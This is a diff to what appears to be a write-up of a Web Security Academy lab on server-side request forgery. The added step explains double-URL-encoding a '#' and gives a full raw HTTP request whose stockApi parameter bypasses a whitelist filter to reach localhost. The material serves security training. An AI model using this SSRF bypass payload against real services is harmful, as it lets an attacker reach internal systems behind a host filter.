@@ -393,7 +393,7 @@ It is an application protocol used over an IP network to manage and access the d
     Te: trailers
     Connection: close
 
-    stockApi=http://username#stock.weliketoshop.net/
+    stockApi=http://username#@stock.weliketoshop.net/
  
  
  ## Respotion 
@@ -410,7 +410,30 @@ It is an application protocol used over an IP network to manage and access the d
  "External stock check host must be stock.weliketoshop.net"
    
  
+ ## Step 3.
  
+ Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username". 
+ 
+ ## Request 
+ 
+    POST /product/stock HTTP/1.1
+Host: 0a6a006303baa1a4c01303c000920096.web-security-academy.net
+Cookie: session=orjDJcIcVUXUwmiMWq57rynkY2ZmXrQI
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0a6a006303baa1a4c01303c000920096.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+Origin: https://0a6a006303baa1a4c01303c000920096.web-security-academy.net
+Content-Length: 61
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+stockApi=http://localhost:80%25%32%33@stock.weliketoshop.net/
  
  
  
